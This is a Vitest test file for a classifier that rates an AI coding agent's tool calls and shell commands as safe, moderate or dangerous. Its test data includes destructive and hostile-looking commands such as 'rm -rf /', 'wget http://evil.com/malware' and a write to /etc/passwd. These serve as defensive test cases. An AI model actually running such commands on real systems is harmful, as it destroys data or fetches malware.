import { describe, it, expect } from 'vitest'
import {
  classifyTool,
  classifyBashCommand,
  SAFE_BASH_PREFIXES,
  SAFE_BASH_EXACT,
  DANGEROUS_BASH_PATTERNS,
} from '../classifier'

// ─── classifyTool ───────────────────────────────────────────

describe('classifyTool', () => {
  describe('static safe tools', () => {
    const safeTools = [
      'Read',
      'LS',
      'Glob',
      'Grep',
      'GitStatus',
      'GitDiff',
      'GitLog',
      'WebFetch',
      'WebSearch',
      'TodoWrite',
    ]
    it.each(safeTools)('%s → safe', tool => {
      expect(classifyTool(tool)).toBe('safe')
    })
  })

  describe('static moderate tools', () => {
    it.each(['Write', 'Edit'])('%s → moderate', tool => {
      expect(classifyTool(tool)).toBe('moderate')
    })
  })

  describe('static dangerous tools', () => {
    it.each(['GitCommit', 'GitPush', 'GitCheckout'])('%s → dangerous', tool => {
      expect(classifyTool(tool)).toBe('dangerous')
    })
  })

  it('unknown tool defaults to moderate', () => {
    expect(classifyTool('SomeRandomMCPTool')).toBe('moderate')
    expect(classifyTool('CustomTool')).toBe('moderate')
  })

  it('Bash delegates to classifyBashCommand', () => {
    expect(classifyTool('Bash', { command: 'ls' })).toBe('safe')
    expect(classifyTool('Bash', { command: 'rm -rf /' })).toBe('dangerous')
    expect(classifyTool('Bash', { command: 'some-unknown-cmd' })).toBe(
      'moderate'
    )
  })

  it('Bash with no input defaults to moderate', () => {
    expect(classifyTool('Bash')).toBe('moderate')
    expect(classifyTool('Bash', {})).toBe('moderate')
  })
})

// ─── classifyBashCommand ────────────────────────────────────

describe('classifyBashCommand', () => {
  it('empty string → moderate', () => {
    expect(classifyBashCommand('')).toBe('moderate')
    expect(classifyBashCommand('   ')).toBe('moderate')
  })

  it('trims whitespace before classifying', () => {
    expect(classifyBashCommand('  ls  ')).toBe('safe')
  })

  describe('compound commands — max risk aggregation', () => {
    it('safe && safe → safe', () => {
      expect(classifyBashCommand('ls && pwd')).toBe('safe')
    })

    it('safe && moderate → moderate', () => {
      expect(classifyBashCommand('ls && some-unknown')).toBe('moderate')
    })

    it('safe && dangerous → dangerous', () => {
      expect(classifyBashCommand('ls && rm file.txt')).toBe('dangerous')
    })

    it('handles || operator', () => {
      expect(classifyBashCommand('ls || rm file.txt')).toBe('dangerous')
    })

    it('handles ; operator', () => {
      expect(classifyBashCommand('pwd; rm file.txt')).toBe('dangerous')
    })

    it('handles | pipe operator', () => {
      expect(classifyBashCommand('cat file.txt | grep foo')).toBe('safe')
    })

    it('early exits on dangerous', () => {
      // Once dangerous is found, no need to check further
      expect(classifyBashCommand('rm -rf / && ls && pwd && echo hi')).toBe(
        'dangerous'
      )
    })

    it('multiple safe commands stay safe', () => {
      expect(classifyBashCommand('ls && pwd && git status && whoami')).toBe(
        'safe'
      )
    })
  })
})

// ─── classifySingleCommand (tested via classifyBashCommand) ─

describe('classifySingleCommand (via classifyBashCommand)', () => {
  describe('dangerous patterns', () => {
    const dangerousCmds = [
      ['rm file.txt', 'rm'],
      ['rmdir mydir', 'rmdir'],
      ['chmod 777 file', 'chmod'],
      ['chown root file', 'chown'],
      ['sudo apt-get install', 'sudo'],
      ['su root', 'su'],
      ['curl http://example.com -X POST', 'curl POST'],
      ['curl http://example.com --request DELETE', 'curl DELETE'],
      ['wget http://evil.com/malware', 'wget'],
      ['kill -9 1234', 'kill'],
      ['killall node', 'killall'],
      ['npm install express', 'npm install'],
      ['npm i lodash', 'npm i'],
      ['yarn add react', 'yarn add'],
      ['pnpm add vue', 'pnpm add'],
      ['bun add hono', 'bun add'],
      ['pip install flask', 'pip install'],
      ['brew install wget', 'brew install'],
      ['git push origin main', 'git push'],
      ['git commit -m "msg"', 'git commit'],
      ['git checkout main', 'git checkout'],
      ['git reset --hard', 'git reset'],
      ['git rebase main', 'git rebase'],
      ['git merge feature', 'git merge'],
      ['git stash drop', 'git stash drop'],
      ['git stash pop', 'git stash pop'],
      ['git stash clear', 'git stash clear'],
    ]

    it.each(dangerousCmds)('%s → dangerous (%s)', cmd => {
      expect(classifyBashCommand(cmd)).toBe('dangerous')
    })

    it('dangerous redirect to absolute path', () => {
      expect(classifyBashCommand('echo hi > /etc/passwd')).toBe('dangerous')
    })

    it('pipe to tee is dangerous', () => {
      expect(classifyBashCommand('echo hi | tee file.txt')).toBe('dangerous')
    })
  })

  describe('safe — exact match', () => {
    it.each(SAFE_BASH_EXACT)('%s → safe', cmd => {
      expect(classifyBashCommand(cmd)).toBe('safe')
    })
  })

  describe('safe — prefix match', () => {
    const prefixCmds = [
      'cat file.txt',
      'head -n 10 file.txt',
      'tail -f log.txt',
      'less readme.md',
      'wc -l file.txt',
      'ls -la',
      'find . -name "*.ts"',
      'tree src/',
      'grep -r "pattern" .',
      'rg pattern',
      'ag pattern',
      'ack pattern',
      'git status --short',
      'git log --oneline',
      'git diff HEAD',
      'git branch -a',
      'git show HEAD',
      'git blame file.ts',
      'git stash list',
      'npm list',
      'npm ls',
      'npm outdated',
      'npm view react',
      'yarn list',
      'yarn info react',
      'yarn why react',
      'pnpm list',
      'pnpm ls',
      'pnpm why react',
      'bun pm ls',
      'npm test',
      'npm run test',
      'npm run lint',
      'npm run check',
      'yarn test',
      'yarn lint',
      'pnpm test',
      'bun test',
      'npx tsc --noEmit',
      'npx eslint .',
      'which node',
      'where python',
      'echo hello world',
      'printf "%s" hello',
      'sort file.txt',
      'uniq file.txt',
      'cut -d: -f1 file.txt',
      'tr a-z A-Z',
      'awk "{print $1}" file.txt',
      'jq .name package.json',
      'node --version',
      'npm --version',
      'python --version',
    ]

    it.each(prefixCmds)('%s → safe', cmd => {
      expect(classifyBashCommand(cmd)).toBe('safe')
    })
  })

  describe('sed -n special case', () => {
    it('sed -n (read-only) → safe', () => {
      expect(classifyBashCommand('sed -n "1,10p" file.txt')).toBe('safe')
    })

    it('sed -n with -i (in-place edit) → moderate', () => {
      expect(classifyBashCommand('sed -n -i "1,10p" file.txt')).toBe('moderate')
    })
  })

  describe('default moderate', () => {
    it('unknown commands → moderate', () => {
      expect(classifyBashCommand('some-random-tool --flag')).toBe('moderate')
      expect(classifyBashCommand('docker build .')).toBe('moderate')
      expect(classifyBashCommand('make build')).toBe('moderate')
    })
  })

  describe('edge cases', () => {
    it('exact "whoami" is safe, not just prefix', () => {
      expect(classifyBashCommand('whoami')).toBe('safe')
    })

    it('"env" is safe via prefix', () => {
      // 'env' is in SAFE_BASH_EXACT? No, it's in SAFE_BASH_PREFIXES as 'env'
      // Actually 'env' is a prefix entry — let's check: it matches 'env' exactly
      // but the prefix list has 'env' without trailing space, so 'env' starts with 'env'
      expect(classifyBashCommand('env')).toBe('safe')
    })

    it('"uname" is safe via exact match', () => {
      expect(classifyBashCommand('uname')).toBe('safe')
    })

    it('"uname -a" is safe via prefix', () => {
      // 'uname' is in SAFE_BASH_PREFIXES without trailing space
      expect(classifyBashCommand('uname -a')).toBe('safe')
    })

    it('ls with tab separator is safe', () => {
      expect(classifyBashCommand('ls\t-la')).toBe('safe')
    })

    it('dangerous pattern takes priority over safe prefix', () => {
      // 'git push' matches dangerous pattern even though 'git ' could be a prefix
      expect(classifyBashCommand('git push origin main')).toBe('dangerous')
    })

    it('curl GET is not dangerous', () => {
      // curl without -X POST/PUT/DELETE/PATCH is not matched by dangerous patterns
      expect(classifyBashCommand('curl http://example.com')).toBe('moderate')
    })

    it('curl -X GET is not dangerous', () => {
      expect(classifyBashCommand('curl http://example.com -X GET')).toBe(
        'moderate'
      )
    })
  })
})

// ─── splitCompoundCommand (tested via classifyBashCommand) ──

describe('splitCompoundCommand (via classifyBashCommand)', () => {
  it('single command returns single classification', () => {
    expect(classifyBashCommand('ls')).toBe('safe')
  })

  it('splits on &&', () => {
    expect(classifyBashCommand('ls && pwd')).toBe('safe')
  })

  it('splits on ||', () => {
    expect(classifyBashCommand('ls || pwd')).toBe('safe')
  })

  it('splits on ;', () => {
    expect(classifyBashCommand('ls; pwd')).toBe('safe')
  })

  it('splits on |', () => {
    expect(classifyBashCommand('ls | grep foo')).toBe('safe')
  })

  it('handles mixed operators', () => {
    expect(classifyBashCommand('ls && pwd; whoami || date')).toBe('safe')
  })

  it('empty parts are filtered out', () => {
    // Trailing operator produces empty string which gets filtered
    expect(classifyBashCommand('ls &&')).toBe('safe')
  })
})

// ─── exported constants sanity checks ───────────────────────

describe('exported constants', () => {
  it('SAFE_BASH_PREFIXES is a non-empty array of strings', () => {
    expect(SAFE_BASH_PREFIXES.length).toBeGreaterThan(0)
    for (const p of SAFE_BASH_PREFIXES) {
      expect(typeof p).toBe('string')
    }
  })

  it('SAFE_BASH_EXACT is a non-empty array of strings', () => {
    expect(SAFE_BASH_EXACT.length).toBeGreaterThan(0)
    for (const e of SAFE_BASH_EXACT) {
      expect(typeof e).toBe('string')
    }
  })

  it('DANGEROUS_BASH_PATTERNS is a non-empty array of RegExp', () => {
    expect(DANGEROUS_BASH_PATTERNS.length).toBeGreaterThan(0)
    for (const p of DANGEROUS_BASH_PATTERNS) {
      expect(p).toBeInstanceOf(RegExp)
    }
  })
})
